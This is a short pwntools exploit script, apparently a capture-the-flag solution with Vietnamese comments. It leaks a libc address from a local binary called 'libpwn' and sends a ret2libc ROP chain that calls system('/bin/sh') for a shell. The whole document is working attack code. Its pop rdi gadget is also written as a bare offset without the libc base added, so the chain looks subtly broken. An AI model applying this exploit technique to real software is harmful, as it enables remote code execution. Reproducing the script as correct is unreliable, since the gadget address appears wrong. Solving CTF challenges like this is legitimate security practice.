#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./libpwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)
input("Attach gdb and press Enter")

p.recvline()
p.recvline()
p.recvline()

fgets = int(p.recvline(), 16)
# libc.address = add_sleep - 0xea5e0
p.info("Address of fgets: " + hex(fgets))
p.info("Address of libc fgets: " + hex(libc.sym.fgets))
libc.address = fgets - libc.sym.fgets

p.info("Address of libc base: " + hex(libc.address))

padding = cyclic_find(b"oaaa")
pop_rdi = p64(0x0000000000028215)
str_shell = p64(next(libc.search(b"/bin/sh")))
ret_address = p64(0x0000000000401016)
system_add = p64(libc.sym.system)
p.info("Address of system: " + hex(libc.sym.system))

# Padding ghi đè giá trị trả về để nhảy đến gadget pop rdi
payload = b"A" * padding
# Nhảy đến pop rdi
payload += pop_rdi
# Ghi địa chỉ của chuỗi /bin/sh vào rdi
payload += str_shell
# Nhảy đến gadget ret để ghi đè địa chỉ trả về đến hàm system
payload += ret_address
# Ghi đè để nhảy đến hàm system
payload += system_add

p.sendlineafter(b"present: ", payload)




p.interactive()